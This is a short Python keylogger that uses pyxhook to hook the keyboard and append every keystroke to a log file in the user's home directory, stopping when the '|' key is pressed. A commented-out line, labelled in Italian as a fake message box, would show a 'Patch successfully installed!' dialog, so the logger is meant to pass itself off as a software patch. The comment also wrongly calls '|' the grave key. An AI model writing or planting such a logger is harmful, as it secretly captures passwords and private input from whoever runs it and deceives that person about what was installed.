import pyxhook
import os
import ctypes

# Getting the home path :

home = os.curdir

if 'HOME' in os.environ:
    home = os.environ['HOME']
elif os.name == 'posix':
    home = os.path.expanduser("~/")
elif os.name == 'nt':
    if 'HOMEPATH' in os.environ and 'HOMEDRIVE' in os.environ:
        home = os.environ['HOMEDRIVE'] + os.environ['HOMEPATH']
else:
    home = os.environ['HOMEPATH']


# change this to your log file's path
# Now it is set in user's home path
log_file=home+'/file.log'

# this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==124: # 124 is the ascii value of the grave key (|)
    fob.close()
    new_hook.cancel()
# instantiate HookManager class
new_hook = pyxhook.HookManager()
# listen to all keystrokes
new_hook.KeyDown=OnKeyPress
# hook the keyboard
new_hook.HookKeyboard()
# start the session
new_hook.start()

# creiamo una falsa message box
# ctypes.windll.user32.MessageBoxW(0, u"Patch successfully installed!", u"Patch", 0)
